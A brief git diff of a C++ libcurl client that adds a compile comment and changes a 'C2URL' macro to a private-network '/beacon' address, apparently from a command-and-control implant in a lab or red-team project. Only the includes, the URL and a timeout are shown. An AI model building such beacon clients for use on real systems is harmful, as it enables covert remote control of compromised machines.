@@ -1,8 +1,9 @@
+// g++ -o client client.cpp -lcurl
 #include <iostream>
 #include <curl/curl.h>
 #include <curl/easy.h>
 
-#define C2URL "http://10.0.0.109:8080/beacon"
+#define C2URL "http://192.168.8.100:8080/beacon"
 
 int main() {
     const long curltimeout = 5;
